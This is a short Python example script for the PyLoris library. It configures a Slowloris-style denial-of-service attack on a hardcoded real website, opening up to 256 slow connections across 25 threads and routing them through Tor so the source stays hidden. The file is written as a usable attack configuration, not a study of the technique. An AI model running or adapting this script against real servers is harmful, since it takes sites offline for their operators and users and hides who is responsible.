#! /usr/bin/env python

"""
scriptloris_http.py
A quick script to demonstrate some of the basic features of scripting
functionality built in to the libloris module.

This script requires TOR to be setup and running on localhost:9050.
"""

host = 'www.motomastyle.com'
port = 80
sockshost = 'localhost'
socksport = 9050

from libloris import *

def main(host, port, sockshost, socksport):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: PyLoris (scriptloris_http.py (http://pyloris.sf.net)\r\n'

    loris.options['threadlimit'] = 25
    loris.options['connectionlimit'] = 256
    loris.options['connectionspeed'] = 15

    # Enable SOCKS5 on local port 9050
    loris.options['socksversion'] = 'SOCKS5'
    loris.options['sockshost'] = sockshost
    loris.options['socksport'] = socksport

    loris.mainloop()

if __name__ == "__main__":
    main(host, port, sockshost, socksport)
